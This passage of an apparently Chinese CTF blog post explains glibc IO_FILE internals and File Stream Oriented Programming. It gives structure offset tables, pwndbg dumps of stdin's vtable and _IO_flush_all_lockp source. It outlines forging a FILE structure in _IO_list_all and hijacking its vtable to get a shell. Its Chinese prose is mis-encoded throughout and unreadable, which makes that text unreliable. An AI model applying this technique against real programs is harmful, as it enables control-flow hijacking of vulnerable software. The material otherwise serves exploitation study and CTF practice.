Set if put and get pointer logicly tied. */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_CURRENTLY_PUTTING 0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_APPENDING 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_IS_FILEBUF 0x2000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_BAD_SEEN 0x4000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_USER_LOCK 0x8000</span><br></code></pre></td></tr></table></figure><p><strong>ray-cp</strong> å¸ˆå‚…è„šæœ¬é‡Œå·çš„ç»“æ„ä½“çš„å„ç§åç§»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#ray-cp/pwn_debug/pwn_debug/IO_FILE_plus.py</span><br><br>_IO_FILE_plus_size = &#123;<br><span class="hljs-string">&#x27;i386&#x27;</span>:<span class="hljs-number">0x98</span>,<br><span class="hljs-string">&#x27;amd64&#x27;</span>:<span class="hljs-number">0xe0</span><br>&#125;<br>_IO_FILE_plus = &#123;<br>    <span class="hljs-string">&#x27;i386&#x27;</span>:&#123;<br>        <span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br>        <span class="hljs-number">0x4</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br>        <span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br>        <span class="hljs-number">0xc</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br>        <span class="hljs-number">0x14</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br>        <span class="hljs-number">0x1c</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br>        <span class="hljs-number">0x24</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br>        <span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br>        <span class="hljs-number">0x2c</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br>        <span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br>        <span class="hljs-number">0x34</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br>        <span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br>        <span class="hljs-number">0x3c</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br>        <span class="hljs-number">0x44</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br>        <span class="hljs-number">0x46</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br>        <span class="hljs-number">0x47</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br>        <span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br>        <span class="hljs-number">0x4c</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br>        <span class="hljs-number">0x54</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br>        <span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br>        <span class="hljs-number">0x5c</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br>        <span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br>        <span class="hljs-number">0x64</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br>        <span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br>        <span class="hljs-number">0x6c</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br>        <span class="hljs-number">0x94</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br>    &#125;,<br><br>    <span class="hljs-string">&#x27;amd64&#x27;</span>:&#123;<br>        <span class="hljs-number">0x0</span>:<span class="hljs-string">&#x27;_flags&#x27;</span>,<br>        <span class="hljs-number">0x8</span>:<span class="hljs-string">&#x27;_IO_read_ptr&#x27;</span>,<br>        <span class="hljs-number">0x10</span>:<span class="hljs-string">&#x27;_IO_read_end&#x27;</span>,<br>        <span class="hljs-number">0x18</span>:<span class="hljs-string">&#x27;_IO_read_base&#x27;</span>,<br>        <span class="hljs-number">0x20</span>:<span class="hljs-string">&#x27;_IO_write_base&#x27;</span>,<br>        <span class="hljs-number">0x28</span>:<span class="hljs-string">&#x27;_IO_write_ptr&#x27;</span>,<br>        <span class="hljs-number">0x30</span>:<span class="hljs-string">&#x27;_IO_write_end&#x27;</span>,<br>        <span class="hljs-number">0x38</span>:<span class="hljs-string">&#x27;_IO_buf_base&#x27;</span>,<br>        <span class="hljs-number">0x40</span>:<span class="hljs-string">&#x27;_IO_buf_end&#x27;</span>,<br>        <span class="hljs-number">0x48</span>:<span class="hljs-string">&#x27;_IO_save_base&#x27;</span>,<br>        <span class="hljs-number">0x50</span>:<span class="hljs-string">&#x27;_IO_backup_base&#x27;</span>,<br>        <span class="hljs-number">0x58</span>:<span class="hljs-string">&#x27;_IO_save_end&#x27;</span>,<br>        <span class="hljs-number">0x60</span>:<span class="hljs-string">&#x27;_markers&#x27;</span>,<br>        <span class="hljs-number">0x68</span>:<span class="hljs-string">&#x27;_chain&#x27;</span>,<br>        <span class="hljs-number">0x70</span>:<span class="hljs-string">&#x27;_fileno&#x27;</span>,<br>        <span class="hljs-number">0x74</span>:<span class="hljs-string">&#x27;_flags2&#x27;</span>,<br>        <span class="hljs-number">0x78</span>:<span class="hljs-string">&#x27;_old_offset&#x27;</span>,<br>        <span class="hljs-number">0x80</span>:<span class="hljs-string">&#x27;_cur_column&#x27;</span>,<br>        <span class="hljs-number">0x82</span>:<span class="hljs-string">&#x27;_vtable_offset&#x27;</span>,<br>        <span class="hljs-number">0x83</span>:<span class="hljs-string">&#x27;_shortbuf&#x27;</span>,<br>        <span class="hljs-number">0x88</span>:<span class="hljs-string">&#x27;_lock&#x27;</span>,<br>        <span class="hljs-number">0x90</span>:<span class="hljs-string">&#x27;_offset&#x27;</span>,<br>        <span class="hljs-number">0x98</span>:<span class="hljs-string">&#x27;_codecvt&#x27;</span>,<br>        <span class="hljs-number">0xa0</span>:<span class="hljs-string">&#x27;_wide_data&#x27;</span>,<br>        <span class="hljs-number">0xa8</span>:<span class="hljs-string">&#x27;_freeres_list&#x27;</span>,<br>        <span class="hljs-number">0xb0</span>:<span class="hljs-string">&#x27;_freeres_buf&#x27;</span>,<br>        <span class="hljs-number">0xb8</span>:<span class="hljs-string">&#x27;__pad5&#x27;</span>,<br>        <span class="hljs-number">0xc0</span>:<span class="hljs-string">&#x27;_mode&#x27;</span>,<br>        <span class="hljs-number">0xc4</span>:<span class="hljs-string">&#x27;_unused2&#x27;</span>,<br>        <span class="hljs-number">0xd8</span>:<span class="hljs-string">&#x27;vtable&#x27;</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="vtable"><a class="header-anchor" href="#vtable">Â¶</a>vtable</h3><p><strong>vtable</strong> æ˜¯å¹²å•¥çš„ï¼Ÿ vtable æŒ‡é’ˆæŒ‡å‘çš„æ˜¯ ğŸ‘´ è¿™ä¸ª IOFILE ç»“æ„ä½“å¯¹åº”çš„å‡½æ•°è¡¨ï¼Œä¸Šè°ƒè¯•ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x _IO_2_1_stdin_<br>$<span class="hljs-number">1</span> = &#123;<br>  file = &#123;<br>    _flags = <span class="hljs-number">0xfbad208b</span>,<br>    _IO_read_ptr = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_read_end = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_read_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_ptr = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_write_end = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_buf_base = <span class="hljs-number">0x7ffb4188da83</span>,<br>    _IO_buf_end = <span class="hljs-number">0x7ffb4188da84</span>,<br>...<br>    _lock = <span class="hljs-number">0x7ffb4188f8d0</span>,<br>    _offset = <span class="hljs-number">0xffffffffffffffff</span>,<br>    _codecvt = <span class="hljs-number">0x0</span>,<br>    _wide_data = <span class="hljs-number">0x7ffb4188dae0</span>,<br>    _freeres_list = <span class="hljs-number">0x0</span>,<br>    _freeres_buf = <span class="hljs-number">0x0</span>,<br>    __pad5 = <span class="hljs-number">0x0</span>,<br>    _mode = <span class="hljs-number">0xffffffff</span>,<br>    _unused2 = &#123;<span class="hljs-number">0x0</span> &lt;repeats <span class="hljs-number">20</span> times&gt;&#125;<br>  &#125;,<br>  vtable = <span class="hljs-number">0x7ffb4188a2a0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸Šé¢æ˜¯ stdin ç»“æ„ä½“ï¼Œä¸‹é¢æ˜¯å®ƒçš„ vtableï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python">pwndbg&gt; p/x *_IO_2_1_stdin_.vtable<br>$<span class="hljs-number">3</span> = &#123;<br>  __dummy = <span class="hljs-number">0x0</span>,<br>  __dummy2 = <span class="hljs-number">0x0</span>,<br>  __finish = <span class="hljs-number">0x7ffb4152e330</span>,<br>  __overflow = <span class="hljs-number">0x7ffb4152f300</span>,<br>  __underflow = <span class="hljs-number">0x7ffb4152f020</span>,<br>  __uflow = <span class="hljs-number">0x7ffb415303c0</span>,<br>  __pbackfail = <span class="hljs-number">0x7ffb41531c50</span>,<br>  __xsputn = <span class="hljs-number">0x7ffb4152d930</span>,<br>  __xsgetn = <span class="hljs-number">0x7ffb4152d590</span>,<br>  __seekoff = <span class="hljs-number">0x7ffb4152cb90</span>,<br>  __seekpos = <span class="hljs-number">0x7ffb41530990</span>,<br>  __setbuf = <span class="hljs-number">0x7ffb4152c850</span>,<br>  __sync = <span class="hljs-number">0x7ffb4152c6d0</span>,<br>  __doallocate = <span class="hljs-number">0x7ffb41520100</span>,<br>  __read = <span class="hljs-number">0x7ffb4152d910</span>,<br>  __write = <span class="hljs-number">0x7ffb4152d190</span>,<br>  __seek = <span class="hljs-number">0x7ffb4152c910</span>,<br>  __close = <span class="hljs-number">0x7ffb4152c840</span>,<br>  __stat = <span class="hljs-number">0x7ffb4152d180</span>,<br>  __showmanyc = <span class="hljs-number">0x7ffb41531dd0</span>,<br>  __imbue = <span class="hljs-number">0x7ffb41531de0</span><br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘åœ¨ stdin ç›¸å…³çš„ IO å‡½æ•°è°ƒç”¨å‡½æ•°æŒ‡é’ˆæ—¶å°±ä¼šä» stdin çš„ vtable é‡Œé¢æŸ¥æ‰¾ç›¸å…³çš„å‡½æ•°æŒ‡é’ˆï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">   <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br> || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>     &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br> )<br>&amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)//å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰æ•°æ®ï¼Œåˆ·æ–°è¾“å‡ºç¼“å†²åŒº<br></code></pre></td></tr></table></figure><p>æ¯”å¦‚è¿™ä¸ª <code>_IO_OVERFLOW</code> å°±ä¼šé¡ºç€ ğŸ‘´ çš„ stdin çš„ vtable æ‘¸åˆ° <code>__overflow = 0x7f3f23542790 &lt;_IO_new_file_overflow&gt;</code> ã€‚</p><p>å½“ç„¶è¿™é‡Œæ˜¯<strong>è°ƒç”¨ä¸äº†</strong> <code>_IO_OVERFLOW</code> çš„ï¼Œå› ä¸º ğŸ‘´ è¿˜æ²¡ ğŸ‘ å®ƒï¼Œæˆ‘åªæ˜¯ä¸¾ä¸ªä¾‹å­è¯´æ˜ä¸€ä¸‹ã€‚</p><h2 id="IO-list-all-æŒ‡é’ˆ"><a class="header-anchor" href="#IO-list-all-æŒ‡é’ˆ">Â¶</a>_IO_list_all æŒ‡é’ˆ</h2><p>å¤„äº libc æ®µçš„ _IO_list_all æŒ‡é’ˆè®°å½•ç€<strong>æœ€è¿‘</strong>ç”Ÿæˆçš„ _IO_FILE_plus ç»“æ„ä½“ï¼Œé€šè¿‡å•é“¾è¡¨çš„å½¢å¼æŠŠæ‰€æœ‰çš„ _IO_FILE_plus ç»“æ„ä½“ä¸²è”èµ·æ¥ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯é€šè¿‡æ²³é‡Œçš„æ”¹å†™è¯¥æŒ‡é’ˆï¼Œå¯ä»¥è¾¾åˆ°ä¼ªé€  _IO_FILE ç»“æ„ä½“çš„ä½œç”¨ï¼Œä¸ºè¿›ä¸€æ­¥çš„ ğŸ‘ åšå‡†å¤‡ã€‚</p><p>å¸¸ç”¨æ‰‹æ³•æ˜¯ unsortdebinï¼ŒLargebin ç­‰ Attack æ‰“ global_max_fast æ”¹å¤§ fastbin çš„æœ€å¤§ sizeï¼Œåœ¨ _IO_list_all å†™å †åœ°å€ï¼Œå½“ç„¶ç›´æ¥å¯¹ _IO_list_all å†»æ‰‹ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œè¯¦ç»†çš„åé¢ä¼šæœ‰ä¾‹é¢˜ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/posts/20190627090036-f9501556-9876-1.png" alt=""></p><h2 id="IOè°ƒç”¨çš„vtableå‡½æ•°"><a class="header-anchor" href="#IOè°ƒç”¨çš„vtableå‡½æ•°">Â¶</a>IOè°ƒç”¨çš„vtableå‡½æ•°</h2><p>åœ¨è¿™é‡Œç»™å‡º <strong>raycp</strong> å¸ˆå‚…æ€»ç»“å‡ºçš„ <code>fopen</code>ã€<code>fread</code>ã€<code>fwrite</code>ã€<code>fclose</code>å››ä¸ªå‡½æ•°ä¼šè°ƒç”¨çš„vtableå‡½æ•°ã€‚æ²¡é”™ï¼Œæˆ‘ç›´æ¥ CV å¤§å¸ˆ ğŸ‘¦ï¼Œè®°ä¸è®°å¾—ä¸‹æ¥æˆ‘ä¸çŸ¥é“ï¼Œä»¥åèµ·ç ç¿»èµ·æ¥æ–¹ä¾¿å¾ˆå¤šã€‚</p><p>fopenå‡½æ•°æ˜¯åœ¨åˆ†é…ç©ºé—´ï¼Œå»ºç«‹FILEç»“æ„ä½“ï¼Œæœªè°ƒç”¨vtableä¸­çš„å‡½æ•°ã€‚</p><p>freadå‡½æ•°ä¸­è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li><code>_IO_sgetn</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_xsgetn</code>ã€‚</li><li><code>_IO_doallocbuf</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li><code>__underflow</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_underflow</code>å®ç°æ–‡ä»¶æ•°æ®è¯»å–ã€‚</li><li>vtableä¸­çš„<code>_IO_new_file_underflow</code>è°ƒç”¨äº†vtable<code>__GI__IO_file_read</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨readã€‚</li></ul><p>fwrite å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li><code>_IO_fwrite</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_new_file_xsputn</code>ã€‚</li><li><code>_IO_new_file_xsputn</code>å‡½æ•°è°ƒç”¨äº†vtableä¸­çš„<code>_IO_new_file_overflow</code>å®ç°ç¼“å†²åŒºçš„å»ºç«‹ä»¥åŠåˆ·æ–°ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_new_file_overflow</code>å‡½æ•°è°ƒç”¨äº†vtableçš„<code>_IO_file_doallocate</code>ä»¥åˆå§‹åŒ–è¾“å…¥ç¼“å†²åŒºã€‚</li><li>vtableä¸­çš„<code>_IO_file_doallocate</code>è°ƒç”¨äº†vtableä¸­çš„<code>__GI__IO_file_stat</code>ä»¥è·å–æ–‡ä»¶ä¿¡æ¯ã€‚</li><li><code>new_do_write</code>ä¸­çš„<code>_IO_SYSWRITE</code>è°ƒç”¨äº†vtable<code>_IO_new_file_write</code>æœ€ç»ˆå»æ‰§è¡Œç³»ç»Ÿè°ƒç”¨writeã€‚</li></ul><p><code>fclose</code>å‡½æ•°è°ƒç”¨çš„vtableå‡½æ•°æœ‰ï¼š</p><ul><li>åœ¨æ¸…ç©ºç¼“å†²åŒºçš„<code>_IO_do_write</code>å‡½æ•°ä¸­ä¼šè°ƒç”¨vtableä¸­çš„å‡½æ•°ã€‚</li><li>å…³é—­æ–‡ä»¶æè¿°ç¬¦<code>_IO_SYSCLOSE</code>å‡½æ•°ä¸ºvtableä¸­çš„<code>__close</code>å‡½æ•°ã€‚</li><li><code>_IO_FINISH</code>å‡½æ•°ä¸ºvtableä¸­çš„<code>__finish</code>å‡½æ•°ã€‚</li></ul><p>å½“ç„¶ï¼ŒIO å‡½æ•°è¿œä¸æ­¢è¿™äº›ã€‚å…¶ä»–çš„ IO å‡½æ•°å†…è¿˜æœ‰å¾ˆå¤šå‡½æ•°æŒ‡é’ˆè¢«è°ƒç”¨äº†ï¼Œè¢«å„ä½å¸ˆå‚…ä»¬å‘æ˜å‡ºæ¥çš„å·²ç»æˆäº†å„å¤§ <code>House</code> äº†ï¼Œå‰©ä¸‹çš„åªèƒ½è¯´éšç¼˜çœ‹åˆ°äº†å°±çœ‹çœ‹èƒ½ä¸èƒ½åˆ©ç”¨ã€‚</p><h2 id="FSOP-File-Stream-Oriented-Programming"><a class="header-anchor" href="#FSOP-File-Stream-Oriented-Programming">Â¶</a>FSOP(File Stream Oriented Programming)</h2><p><strong>FSOP</strong> è´¯ç©¿æ•´ä¸ª IO åˆ©ç”¨ï¼ŒğŸ‘´ å°è±¡ä¸­å¸¦ OP ä¿©å­—ä¸æ˜¯ <strong>Oæ³¡</strong> å°±æ˜¯ <strong>å¯¼å‘ç¼–ç¨‹</strong>ã€‚æ’é™¤æ³•å¾— FSOP æ˜¯å¯ä»¥å®ç°ç±»ä¼¼ ROP ä¸€æ ·çš„<strong>æ§åˆ¶æµåŠ«æŒ</strong>çš„ã€‚</p><p><strong>FSOP</strong> ä¸»è¦åˆ©ç”¨äº† <strong>_IO_flush_all_lockp</strong> å‡½æ•°ï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯åˆ·æ–°æ‰€æœ‰FILEç»“æ„ä½“çš„è¾“å‡ºç¼“å†²åŒºï¼Œå…ˆæ”¾ä¸€æ®µä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *<span class="hljs-title">fp</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>#éå† _IO_list_all<br>  <span class="hljs-title function_">for</span> <span class="hljs-params">(fp = (_IO_FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)</span><br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>   )<br>  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<span class="hljs-comment">//å¦‚æœè¾“å‡ºç¼“å†²åŒºæœ‰æ•°æ®ï¼Œåˆ·æ–°è¾“å‡ºç¼“å†²åŒº</span><br>result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…³é”®åœ¨äºå®ƒè¿™é‡Œ<strong>éå†</strong>äº† <strong>_IO_list_all</strong> ï¼Œä¸”è°ƒç”¨äº† <strong>_IO_OVERFLOW</strong> è¿™ä¸ª <strong>vtable</strong> é‡Œé¢çš„å‡½æ•°ã€‚é€šè¿‡åŠ«æŒè¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç©ä¸€ç³»åˆ—çš„æ“ä½œã€‚ä¸€èˆ¬æ€è·¯æ˜¯åœ¨å¯æ§åŒºåŸŸä¼ªé€ ä¸€ä¸ªç»“æ„ä½“ï¼Œå¡å…¥ <strong>_IO_list_all</strong> è¿™ä¸ªé“¾è¡¨é‡Œé¢ï¼ˆğŸ‘ å…¶ä»–ç»“æ„ä½“çš„ <strong>_chain</strong> æŒ‡é’ˆæˆ–è€…ç›´æ¥ ğŸ‘ _IO_list_all æŒ‡é’ˆï¼‰ã€‚ç„¶ååœ¨ä¼ªé€ çš„ç»“æ„ä½“å¤„åŠ«æŒ vtableã€‚</p><p>äº‹å®ä¸Šï¼Œä¼š<code>_IO_flush_all_lockp</code>è°ƒç”¨å‡½æ•°çš„æ—¶æœºåŒ…æ‹¬ï¼š</p><ul><li>libcæ‰§è¡Œabortå‡½æ•°æ—¶ï¼ˆå†…å­˜é”™è¯¯ï¼‰ã€‚åˆ«çš„å¸ˆå‚…æœ‰å†™åˆ° <strong>libc &lt; 2.26</strong> æœ‰æ•ˆï¼Œæ²¡å…·ä½“è¯•è¿‡ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€‰æ‹©æ‰“ <strong>Kiwi</strong>ã€‚</li><li>ç¨‹åºæ˜¾å¼è°ƒç”¨ exit å‡½æ•°æ—¶ï¼Œ<code>_exit</code> ä¸è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‰“ <strong>Kiwi</strong>ã€‚</li><li>ç¨‹åºä»mainå‡½æ•°è¿”å›æ—¶ï¼Œç»“æŸæ—¶ç›´æ¥è°ƒ <code>syscall</code> ä¹Ÿä¸è¡Œã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ‰“ <strong>Kiwi</strong>ã€‚</li></ul><p>æ‹¿ä¸€å¼  CTF-Wiki çš„å›¾ï¼Œè™½ç„¶æ‰“å°å‡ºäº†æŠ¥é”™ä¿¡æ¯ï¼Œè¿˜æ˜¯æ‰§è¡Œäº† <strong>_IO_OVERFLOW</strong> è¿™ä¸ªå‡½æ•°ã€‚æ‰€ä»¥ä¸€é¡¿æ“ä½œç›´æ¥æ‰“å‡ºäº†é”™è¯¯ä¿¡æ¯çš„åŒæ—¶<code>getshell</code> æˆ–è€… <code>orw flag</code> éƒ½æ˜¯åŸºæ§½ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/abort_routine.001.jpeg" alt=""></p><p>çœ‹ä¸‹ä¸Šè¿°ä¸‰ç§æƒ…å†µçš„å †æ ˆï¼Œæ¥è¿›ä¸€æ­¥äº†è§£ç¨‹åºçš„æµç¨‹ã€‚å°†æ–­ç‚¹ä¸‹åœ¨<code>_IO_flush_all_lockp</code>ï¼ŒæŸ¥çœ‹æ ˆç»“æ„ã€‚</p><h3 id="Abort-æ ˆå›æº¯"><a class="header-anchor" href="#Abort-æ ˆå›æº¯">Â¶</a>Abort æ ˆå›æº¯</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">_IO_flush_all_lockp (do_lock=do_lock@entry=<span class="hljs-number">0x0</span>)<br>__GI_abort ()<br>__libc_message 